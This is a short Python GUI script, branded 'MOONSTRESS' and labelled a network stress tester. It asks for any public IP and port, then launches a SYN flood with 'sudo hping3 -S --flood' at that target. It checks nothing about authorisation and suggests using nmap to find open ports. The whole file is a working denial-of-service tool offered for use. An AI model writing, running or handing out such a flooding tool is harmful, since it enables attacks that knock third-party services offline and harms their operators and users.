import subprocess
import tkinter as tk
from tkinter import messagebox

def BeginStress():
    ip = ip_entry.get()
    port = port_entry.get()

    command = "which hping3"
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()
    if not output:
        messagebox.showerror("Damn", "ayo u gotta install hping3")
        return

    command = f"sudo hping3 -p {port} -S --flood {ip}"
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()

    
window = tk.Tk()
window.title("Network Stress Tester")

welcome_label = tk.Label(window, text="	THIS IS THE POWER OF MOONSTRESS	")
ip_label = tk.Label(window, text="Public IP:")
ip_entry = tk.Entry(window)
port_label = tk.Label(window, text="Port(Use nmap to look for open ports):")
port_entry = tk.Entry(window)
result_label = tk.Label(window, text="")
begin_button = tk.Button(window, text="|Start unleashing(Stop with CTRL+C)|", command=BeginStress)

# arrange the widgets
welcome_label.pack()
ip_label.pack()
ip_entry.pack()
port_label.pack()
port_entry.pack()
begin_button.pack()
result_label.pack()

# start the GUI
window.mainloop()
